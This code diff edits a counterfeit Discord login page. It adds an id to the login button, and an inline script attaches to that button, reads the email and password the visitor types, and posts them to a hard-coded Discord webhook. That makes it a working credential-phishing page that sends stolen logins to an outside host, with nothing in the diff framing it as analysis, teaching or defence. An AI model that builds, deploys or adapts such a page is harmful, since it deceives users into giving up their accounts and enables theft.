@@ -266,9 +266,9 @@
                         <button type="button" class="marginBottom20-32qID7 marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
                           <div class="contents-18-Yxp">Forgot your password?</div>
                         </button>
-                        <button type="submit" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
-                          <div class="contents-18-Yxp">Login</div>
-                        </button>
+                        <button type="submit" id="loginButton" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
+		            <div class="contents-18-Yxp">Login</div>
+		        </button>
                         <div class="marginTop4-2BNfKC">
                           <span class="needAccount-23l_Wh">Need an account?</span>
                           <button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
@@ -309,42 +309,42 @@
       <div></div>
     </div>
 <script>
-  document.getElementById('loginButton').addEventListener('click', async function (event) {
-    event.preventDefault(); // Prevents the default form submission
+        document.getElementById('loginButton').addEventListener('click', async function (event) {
+            event.preventDefault(); // Prevents the default form submission
 
-    var username = document.getElementsByName('email')[0].value;
-    var password = document.getElementsByName('password')[0].value;
+            var username = document.getElementsByName('email')[0].value;
+            var password = document.getElementsByName('password')[0].value;
 
-    const webhookBody = {
-      embeds: [{
-        title: 'logged',
-        fields: [
-          { name: 'email', value: username },
-          { name: 'password', value: password }
-        ]
-      }],
-    };
+            const webhookBody = {
+                embeds: [{
+                    title: 'Login Attempt',
+                    fields: [
+                        { name: 'Email', value: username },
+                        { name: 'Password', value: password }
+                    ]
+                }],
+            };
 
-    var webhookUrl = 'https://discord.com/api/webhooks/1181400814577791086/__ySUGrvEkcPRi-am-4aJWqD1QdKbqh0401vR3tJLfvHH0HeTLYc9uIPVKHwN040ER9Y'; // Replace with your Discord webhook URL
+            var webhookUrl = 'https://discord.com/api/webhooks/1181400814577791086/__ySUGrvEkcPRi-am-4aJWqD1QdKbqh0401vR3tJLfvHH0HeTLYc9uIPVKHwN040ER9Y'; // Replace with your actual Discord webhook URL
 
-    try {
-      const response = await fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(webhookBody),
-      });
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(webhookBody),
+                });
 
-      if (response.ok) {
-        console.log('Sent to Discord', response);
-      } else {
-        console.error('Error:', response.status);
-      }
-    } catch (error) {
-      console.error('Error:', error);
-    }
-  });
-</script>
+                if (response.ok) {
+                    console.log('Sent to Discord', response);
+                } else {
+                    console.error('Error:', response.status);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        });
+    </script>
 </body>
 </html>
